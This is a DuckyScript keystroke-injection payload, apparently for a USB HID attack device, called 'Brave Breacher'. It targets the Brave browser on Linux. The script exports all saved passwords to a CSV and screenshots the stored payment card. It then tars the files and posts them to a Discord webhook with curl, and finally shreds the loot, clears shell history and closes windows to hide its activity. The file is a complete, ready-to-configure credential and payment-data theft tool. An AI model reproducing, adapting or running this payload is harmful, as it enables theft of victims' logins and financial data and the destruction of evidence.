REM TITLE: Brave_Breacher
REM AUTHOR: OSINTI4L (https://github.com/OSINTI4L)
REM TARGET OS: Linux (tested on Pop!_OS) | Brave Browser Flatpak Version: 1.77.101
REM DESCRIPTION: Brave Breacher is a side-channel attack payload that utilizes various methods to navigate the Brave Browser GUI. The payload has two phases: Phase 1, all username and password credentials stored in the browser are exported to be exfiltrated. Phase 2, the payload then navigates to the payment method settings menu and screenshots the stored payment method. The files are then moved to the /Pictures/Screenshots directory, tarballed, and then exfiltrated via Discord webhook. All files in the /Pictures/Screenshots directory are then shredded and the terminal history is cleared and all windows opened are closed to obfuscate activity. To be functional: insert USER to lines 68/78, add Discord webhook to line 76.

REM Begin attack:
ATTACKMODE HID
DELAY 1000

REM Launching Brave Browser:
INJECT_MOD
    GUI
    DELAY 200
    STRING brav
    DELAY 100
    ENTER
DELAY 600

REM Phase 1, Accessing password manager:
STRINGLN brave://password-manager/passwords
DELAY 300

REM Password manager is now open.
REM Navigating to password manager settings menu:
REPEAT 2 TAB
DELAY 50
DOWN
DELAY 50
ENTER
DELAY 50

REM Downloading "Brave Passwords.csv" locally to home directory:
REPEAT 4 TAB
ENTER
DELAY 85
ENTER
DELAY 300

REM Phase 2, Navigating to payment method settings:
CTRL l
DELAY 200
STRINGLN brave://settings/payments
DELAY 200
REPEAT 5 TAB
DELAY 150
ENTER
DELAY 150
ENTER
DELAY 150

REM Taking screenshot of payment method stored in browser:
PRINTSCREEN
DELAY 150
STRINGLN c
DELAY 150
ENTER
DELAY 150

REM Closing Brave Browser:
CTRL w

REM Opening terminal window:
DELAY 200
CTRL ALT t
DELAY 300

REM Moving Brave password file to /Pictures/Screenshots:
STRINGLN mv 'Brave Passwords.csv' /home/USER/Pictures/Screenshots

REM Changing directory and creating tarball (loot.tar.gz) of all files in Pictures/Screenshots directory:
STRINGLN cd Pictures/Screenshots
	STRINGLN tar -czf loot.tar.gz *
	DELAY 75

REM Exfiltrating "loot.tar.gz" via Discord webhook:
DEFINE WEBHOOK_URL https://discord.com/api/webhooks/PLACE/DISCORD/WEBHOOK
    STRINGLN curl -X POST -H "Content-Type: multipart/form-data" \
    STRINGLN -F "file=@/home/USER/Pictures/Screenshots/loot.tar.gz" \
    STRINGLN -F "content=$ Loot Incoming $" \
    STRINGLN WEBHOOK_URL
 	DELAY 100

REM Shredding all files in directory Pictures/Screenshots, clearing terminal session history, and exiting terminal to obfuscate activity:
STRINGLN shred -fuz *
DELAY 25
	STRINGLN history -c
	DELAY 25
		STRINGLN exit
